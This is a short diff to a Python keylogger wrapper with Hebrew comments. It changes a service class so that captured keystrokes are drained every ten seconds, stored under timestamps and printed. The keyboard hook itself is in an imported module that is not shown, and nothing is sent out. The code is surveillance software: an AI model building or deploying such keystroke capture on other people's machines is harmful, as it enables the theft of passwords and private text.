@@ -2,6 +2,7 @@ from abc import ABC, abstractmethod
 from typing import List
 import time
 from KeyLoggerAgent2 import Listener, logged_keys
+import datetime
 
 
 class IKeyLogger(ABC):
@@ -31,16 +32,26 @@ class KeyLoggerService(IKeyLogger):
         self._active = False
 
     def get_logged_keys(self) -> List[str]:
-        return list(logged_keys)
 
+        t=logged_keys.copy()
+        logged_keys.clear()
+        return t
 
 # שימוש לדוגמה
 
 keylogger = KeyLoggerService()
 keylogger.start_logging()
 
+
+
+
+k={}
 while Listener.is_alive():
-    time.sleep(0.5)
+    time.sleep(10)
+    i=datetime.datetime.now()
+
+    k[i] =("".join(keylogger.get_logged_keys()))
+    print(k)
 
 print("נאספו מקשים:")
 print("".join(keylogger.get_logged_keys()))
